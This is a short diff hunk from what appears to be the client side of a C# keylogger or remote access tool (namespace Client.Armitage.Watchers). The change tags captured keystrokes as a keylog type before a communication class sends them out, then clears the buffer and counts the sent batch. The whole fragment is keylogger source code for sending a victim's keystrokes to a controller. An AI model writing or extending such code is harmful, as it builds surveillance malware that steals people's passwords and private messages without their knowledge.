@@ -168,7 +168,7 @@ namespace Client.Armitage.Watchers
             {  // Only send if there are logged strokes, obviously.
                 if (RawLogged.Length >= 1)
                 {
-                    Communication.String_Stacker.Send(RawLogged.ToString());
+                    Communication.String_Stacker.Send(RawLogged.ToString(), Communication.String_Stacker.StringType.Keylog);
                     RawLogged.Clear();
 
                     StrokesSend++;
